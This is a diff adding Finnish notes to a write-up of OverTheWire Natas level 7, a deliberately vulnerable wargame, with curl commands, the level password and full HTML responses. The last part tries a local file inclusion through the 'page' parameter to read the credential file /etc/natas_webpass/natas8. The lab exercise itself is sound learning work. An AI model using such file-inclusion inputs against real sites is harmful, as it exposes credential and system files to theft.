@@ -294,7 +294,160 @@ Options 2 toimiva polku linkki; `http://natas7.natas.labs.overthewire.org/index.
 
 # Level 7 - 1 - Kali Linux version - START HERE;
 
+natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 
+- tämä voi olla itselleni yleisin käyttö `curl` - komento; <br>
+`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org`
+
+- toisena ehkä tämä on parempi, mutta sama idea, että hakee headerinsä, ja sitten -u (ssh käyttiksen) `username:password`, ja sitten se URL polku `/index.html` ja jne; <br>
+`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+```
+
+
+**samat tarkoittavat polu**, mutta menin vain mutkalla, mutta periaatteessa alemmat kolmet on samaa tarkoittavaa <br>
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=home
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+this is the front page
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+this is the front page
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=about"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+this is the about page
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+```
+
+**seuraavaksi** testataan toi ohje/vinkki natas8 salasansa - START HERE;
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home/etc/natas_webpass/natas8"
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
+<body>
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<br>
+<br>
+<br />
+<b>Warning</b>:  include(home/etc/natas_webpass/natas8): failed to open stream: No such file or directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening 'home/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
+
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+</body>
+</html>
+```
 
 
 
